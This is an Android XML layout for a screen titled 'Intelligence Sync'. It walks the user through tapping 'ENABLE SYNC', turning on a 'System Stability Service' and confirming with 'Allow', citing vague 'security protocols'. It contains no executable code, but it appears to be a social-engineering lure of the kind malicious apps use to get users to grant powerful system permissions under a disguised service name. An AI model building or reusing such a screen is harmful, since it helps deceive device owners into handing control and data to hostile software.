<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#FFFFFF"
    android:gravity="center"
    android:orientation="vertical"
    android:padding="32dp">

    <ImageView
        android:layout_width="219dp"
        android:layout_height="191dp"
        android:layout_marginTop="40dp"
        android:src="@drawable/ic_android_robot" />

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginTop="15dp"
        android:text="Intelligence Sync"
        android:textColor="#202124"
        android:textSize="24sp"
        android:textStyle="bold" />

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginTop="2dp"
        android:layout_marginBottom="32dp"
        android:gravity="center"
        android:text="Enable background data synchronization to maintain connection with security protocols:"
        android:textColor="#5F6368"
        android:textSize="15sp" />

    <TextView
        android:layout_width="311dp"
        android:layout_height="53dp"
        android:layout_marginVertical="8dp"
        android:background="#F1F3F4"
        android:padding="16dp"
        android:text="1. Tap 'ENABLE SYNC'"
        android:textColor="#202124"
        android:textSize="16sp"
        android:textStyle="bold" />

    <TextView
        android:layout_width="311dp"
        android:layout_height="72dp"
        android:layout_marginVertical="8dp"
        android:background="#F1F3F4"
        android:padding="16dp"
        android:text="2. Find 'System Stability Service' and toggle it ON"
        android:textColor="#202124"
        android:textSize="16sp"
        android:textStyle="bold" />

    <TextView
        android:layout_width="311dp"
        android:layout_height="49dp"
        android:layout_marginVertical="8dp"
        android:background="#F1F3F4"
        android:padding="16dp"
        android:text="3. Tap 'Allow' to confirm"
        android:textColor="#202124"
        android:textSize="16sp"
        android:textStyle="bold" />

    <com.google.android.material.button.MaterialButton
        android:id="@+id/btnGuideAction"
        android:layout_width="257dp"
        android:layout_height="64dp"
        android:layout_marginTop="20dp"
        android:text="ENABLE SYNC"
        android:textColor="#FFFFFF"
        android:textSize="14sp"
        android:textStyle="bold"
        app:backgroundTint="#1A73E8"
        app:cornerRadius="100dp" />

</LinearLayout>
